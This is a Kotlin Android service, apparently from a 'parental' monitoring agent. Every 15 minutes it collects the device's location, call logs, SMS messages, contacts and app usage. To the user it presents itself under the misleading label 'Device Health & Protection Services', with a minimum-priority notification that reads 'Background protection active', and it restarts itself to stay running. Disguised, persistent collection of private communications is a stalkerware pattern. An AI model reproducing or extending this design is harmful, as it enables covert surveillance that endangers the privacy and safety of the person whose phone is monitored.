package com.parental.agent.services

import android.Manifest
import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import com.parental.agent.collectors.appusage.AppUsageCollector
import com.parental.agent.collectors.calls.CallCollector
import com.parental.agent.collectors.contacts.ContactCollector
import com.parental.agent.collectors.location.LocationCollector
import com.parental.agent.collectors.sms.SmsCollector
import kotlinx.coroutines.*

class ForegroundService : Service() {

    companion object {
        private const val TAG = "ForegroundService"
        private const val NOTIFICATION_ID = 1001
        private const val CHANNEL_ID = "device_health_services_channel"
        private const val COLLECTION_INTERVAL_MS = 15 * 60 * 1000L // Every 15 minutes
    }

    private val serviceJob = Job()
    private val serviceScope = CoroutineScope(Dispatchers.IO + serviceJob)

    override fun onCreate() {
        super.onCreate()
        startServiceForeground()
        startTelemetryCollectorsLoop()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceJob.cancel()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun startTelemetryCollectorsLoop() {
        serviceScope.launch {
            val locationCollector = LocationCollector(this@ForegroundService)
            val callCollector = CallCollector(this@ForegroundService)
            val smsCollector = SmsCollector(this@ForegroundService)
            val contactCollector = ContactCollector(this@ForegroundService)
            val appUsageCollector = AppUsageCollector(this@ForegroundService)

            while (isActive) {
                try {
                    val locCount = locationCollector.collect()
                    val callCount = callCollector.collect()
                    val smsCount = smsCollector.collect()
                    val contactCount = contactCollector.collect()
                    val usageCount = appUsageCollector.collect()

                    Log.d(TAG, "Telemetry Loop executed: Loc=$locCount, Calls=$callCount, SMS=$smsCount, Contacts=$contactCount, Usage=$usageCount")
                } catch (e: Exception) {
                    Log.e(TAG, "Error in telemetry collection loop: ${e.message}", e)
                }
                delay(COLLECTION_INTERVAL_MS)
            }
        }
    }

    private fun startServiceForeground() {
        try {
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val channel = NotificationChannel(
                    CHANNEL_ID,
                    "Device Health & Protection Services",
                    NotificationManager.IMPORTANCE_MIN
                ).apply {
                    description = "Maintains persistent background telemetry sync and watchdog services."
                }
                notificationManager.createNotificationChannel(channel)
            }

            val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Device Health Service")
                .setContentText("Background protection active")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setOngoing(true)
                .build()

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) { // Android 14+ (API 34)
                val hasLocationPermission = ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
                        ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED

                val foregroundServiceType = if (hasLocationPermission) {
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                } else {
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                }

                startForeground(NOTIFICATION_ID, notification, foregroundServiceType)
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) { // Android 10+ (API 29)
                startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
            } else {
                startForeground(NOTIFICATION_ID, notification)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start foreground service: ${e.message}", e)
        }
    }
}
